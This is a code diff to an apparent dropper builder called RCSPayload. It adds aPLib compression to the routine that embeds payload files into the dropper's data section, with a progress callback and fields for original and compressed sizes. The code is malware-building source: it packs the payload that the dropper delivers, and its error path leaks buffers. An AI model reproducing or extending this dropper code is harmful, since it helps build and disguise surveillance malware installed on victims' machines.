@@ -3,8 +3,11 @@
 #include <string>
 using namespace std;
 
+#include <boost/shared_ptr.hpp>
 #include <boost/filesystem/fstream.hpp>
 namespace bf = boost::filesystem;
+
+#include <aplib.h>
 
 #include "DropperCode.h"
 #include "Components.h"
@@ -130,13 +133,32 @@ std::size_t RCSPayload::embedFunction_( const DataBuffer& source, DataSectionBlo
 	return alignToDWORD( source.size );
 }
 
+unsigned int ratio(unsigned int x, unsigned int y)
+{
+	if (x <= UINT_MAX / 100) x *= 100; else y /= 100;
+	if (y == 0) y = 1;
+	return x / y;
+}
+
+int __stdcall callback(unsigned int insize, unsigned int inpos, unsigned int outpos, void *cbparam)
+{
+	printf("\rcompressed %u -> %u bytes (%u%% done)", inpos, outpos, ratio(inpos, insize));
+	return 1;
+}
+
 std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
 {
-	file.size = (DWORD) bf::file_size(path);
-	cout << __FUNCTION__ << " file size: " << file.size << endl;
-	if (file.size == 0)
+	// TODO move to auto pointers
+
+	std::size_t size = (DWORD) bf::file_size(path);
+	cout << __FUNCTION__ << " file size: " << size << endl;
+	if (size == 0)
 		return 0;
 	
+	// save original size
+	file.original_size = size;
+
+	// save name of file
 	char* p = ptr;
 	name.offset = ((DWORD)p - (DWORD)cooked_.get());
 	
@@ -145,17 +167,45 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 	memcpy(ptr, filename.c_str(), name.size);
 	p += name.size;
 	
+	// open file
 	file.offset = ((DWORD)p - (DWORD)cooked_.get());
 	bf::ifstream fs;
 	fs.open(path, ios::in | ios::binary);
 	
-	fs.read(p, file.size);
+	// read file
+	char* buf = new char[size];
+	fs.read(buf, size);
 	std::size_t n = fs.gcount();
-	cout << __FUNCTION__ << " read: " << n << endl;
-	p += file.size;
+	
+	// compress data
+	char* packed = new char[aP_max_packed_size(size)];
+	char *workmem = new char[aP_workmem_size(size)];
+	
+	int packed_size = aP_pack(buf, packed, size, workmem, callback, NULL);
+	printf("\n");
+	if (packed_size == APLIB_ERROR) {
+		printf("Error compressing!\n");
+		return 0;
+	}
+    
+	delete [] buf;
+	
+	// save compressed size
+	file.size = packed_size;
+	
+	if (workmem) {
+		delete [] workmem;
+		workmem = NULL;
+	}
+	
+	// write compressed to buffer
+	memcpy(p, packed, packed_size);
+	p += packed_size;
+
+	delete [] packed;
 	
 	std::size_t ret = ((DWORD)p - (DWORD)ptr);
-	cout << __FUNCTION__ << " size: " << ret << endl;
+	cout << __FUNCTION__ << " size: " << dec << ret << endl;
 	
 	return ret;
 }
@@ -251,7 +301,6 @@ std::size_t RCSPayload::embedDllCalls_( DropperHeader* header, char* ptr )
 	cout << __FUNCTION__ << " size: " << ret << endl;
 	return ret;
 }
-
 
 bool RCSPayload::write( bf::path file )
 {
